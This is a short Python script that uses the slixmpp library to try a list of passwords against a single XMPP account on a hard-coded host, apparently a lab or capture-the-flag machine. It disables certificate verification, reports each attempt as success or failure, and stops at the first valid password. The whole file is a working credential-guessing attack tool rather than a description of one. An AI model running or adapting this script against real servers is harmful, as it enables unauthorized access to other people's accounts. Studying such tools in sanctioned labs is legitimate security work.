import asyncio, ssl, sys, logging
from slixmpp import ClientXMPP
logging.basicConfig(level=logging.CRITICAL)
HOST="10.129.4.51"; PORT=5222
JID=sys.argv[1]
PWS=sys.argv[2:]
async def test(jid, pw):
    x=ClientXMPP(jid, pw)
    x.ssl_context.check_hostname=False; x.ssl_context.verify_mode=ssl.CERT_NONE
    ok={'v':None}
    ev=asyncio.Event()
    def good(e): ok['v']=True; ev.set(); x.disconnect()
    def bad(e): ok['v']=False; ev.set()
    x.add_event_handler("session_start", good)
    x.add_event_handler("failed_auth", bad)
    x.add_event_handler("disconnected", lambda e: ev.set())
    x.connect(HOST,PORT)
    try: await asyncio.wait_for(ev.wait(), timeout=20)
    except asyncio.TimeoutError: pass
    return ok['v']
async def main():
    for pw in PWS:
        r=await test(JID, pw)
        print(f"{'[+] SUCCESS' if r else '[-] fail   '}  {JID} : {pw}")
        if r: break
asyncio.run(main())
